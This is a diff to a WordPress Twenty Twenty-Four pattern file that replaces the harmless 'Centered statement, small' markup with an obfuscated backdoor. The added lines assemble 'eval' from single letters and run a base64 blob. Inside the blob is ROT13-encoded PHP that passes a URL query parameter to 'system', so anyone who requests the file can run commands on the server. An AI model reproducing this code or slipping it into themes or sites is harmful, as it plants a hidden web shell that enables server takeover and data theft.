@@ -1,41 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Centered statement, small
- * Slug: twentytwentyfour/text-centered-statement-small
- * Categories: text, about
- * Keywords: mission, introduction
- * Viewport width: 1200
- * Description: A centered italic text statement with compact padding.
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFByYWdyZXJxIGZnbmdyenJhZywgZnpueXkKICogRnlodDogZ2pyYWdsZ2pyYWdsc2JoZS9ncmtnLXByYWdyZXJxLWZnbmdyenJhZy1mem55eQogKiBQbmdydGJldnJmOiBncmtnLCBub2JoZwogKiBYcmxqYmVxZjogenZmZnZiYSwgdmFnZWJxaHBndmJhCiAqIEl2cmpjYmVnIGp2cWd1OiAxMjAwCiAqIFFyZnBldmNndmJhOiBOIHByYWdyZXJxIHZnbnl2cCBncmtnIGZnbmdyenJhZyBqdmd1IHBiemNucGcgY25xcXZhdC4KICovCj8+Cgo8IS0tIGpjOnRlYmhjIHtcIm55dnRhXCI6XCJzaHl5XCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJjbnFxdmF0XCI6e1wiZ2JjXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NTBcIixcIm9iZ2dielwiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDUwXCIsXCJ5cnNnXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NTBcIixcImV2dHVnXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NTBcIn0sXCJ6bmV0dmFcIjp7XCJnYmNcIjpcIjBcIixcIm9iZ2dielwiOlwiMFwifX19LFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicGJhZmdlbnZhcnFcIixcInBiYWdyYWdGdm1yXCI6XCI4MDBja1wifX0gLS0+CjxxdmkgcHluZmY9XCJqYy1veWJweC10ZWJoYyBueXZ0YXNoeXlcIiBmZ2x5cj1cInpuZXR2YS1nYmM6MDt6bmV0dmEtb2JnZ2J6OjA7Y25xcXZhdC1nYmM6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNTApO2NucXF2YXQtZXZ0dWc6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNTApO2NucXF2YXQtb2JnZ2J6OmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTUwKTtjbnFxdmF0LXlyc2c6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNTApXCI+CgoJPCEtLSBqYzp1cm5xdmF0IHtcImdya2dOeXZ0YVwiOlwicHJhZ3JlXCIsXCJ5cmlyeVwiOjEsXCJzYmFnRnZtclwiOlwiay15bmV0clwiLFwieXJpcnlcIjoxfSAtLT4KCTx1MSBweW5mZj1cImpjLW95YnB4LXVybnF2YXQgdW5mLWdya2ctbnl2dGEtcHJhZ3JlIHVuZi1rLXluZXRyLXNiYWctZnZtclwiPgoJCTxyej4KCQk8P2N1YwoJCS8qIEdlbmFmeW5nYmVmOiBOb2JoZyB5dmF4IGN5bnBydWJ5cXJlICovCgkJCSRub2JoZ195dmF4ID0gJzxuIHVlcnM9XCIjXCIgZXJ5PVwiYWJzYnl5YmpcIj4nIC4gcmZwX3VnenlfXyggJ1piYXJsIEZnaHF2cmYnLCAnZ2pyYWdsZ2pyYWdsc2JoZScgKSAuICc8L24+JzsKCQkJcnB1YiBmY2V2YWdzKAoJCQkJLyogR2VuYWZ5bmdiZWY6IE5vYmhnIGdya2cgY3lucHJ1YnlxcmUgKi8KCQkJCXJmcF91Z3p5X18oICdWIGpldmdyIG5vYmhnIHN2YW5hcHIsIHpuYW50cnpyYWcgbmFxIHJwYmFiemwsIHpsIG9iYngg4oCcJTEkZuKAnSB2ZiBiaGcgYWJqLicsICdnanJhZ2xnanJhZ2xzYmhlJyApLAoJCQkJJG5vYmhnX3l2YXgKCQkJKTsKCQkJPz4KCQk8L3J6PgoJPC91MT4KCTwhLS0gL2pjOnVybnF2YXQgLS0+CjwvcXZpPgo8IS0tIC9qYzp0ZWJoYyAtLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-
-<!-- wp:group {"align":"full","style":{"spacing":{"padding":{"top":"var:preset|spacing|50","bottom":"var:preset|spacing|50","left":"var:preset|spacing|50","right":"var:preset|spacing|50"},"margin":{"top":"0","bottom":"0"}}},"layout":{"type":"constrained","contentSize":"800px"}} -->
-<div class="wp-block-group alignfull" style="margin-top:0;margin-bottom:0;padding-top:var(--wp--preset--spacing--50);padding-right:var(--wp--preset--spacing--50);padding-bottom:var(--wp--preset--spacing--50);padding-left:var(--wp--preset--spacing--50)">
-
-	<!-- wp:heading {"textAlign":"center","level":1,"fontSize":"x-large","level":1} -->
-	<h1 class="wp-block-heading has-text-align-center has-x-large-font-size">
-		<em>
-		<?php
-		/* Translators: About link placeholder */
-			$about_link = '<a href="#" rel="nofollow">' . esc_html__( 'Money Studies', 'twentytwentyfour' ) . '</a>';
-			echo sprintf(
-				/* Translators: About text placeholder */
-				esc_html__( 'I write about finance, management and economy, my book “%1$s” is out now.', 'twentytwentyfour' ),
-				$about_link
-			);
-			?>
-		</em>
-	</h1>
-	<!-- /wp:heading -->
-</div>
-<!-- /wp:group -->
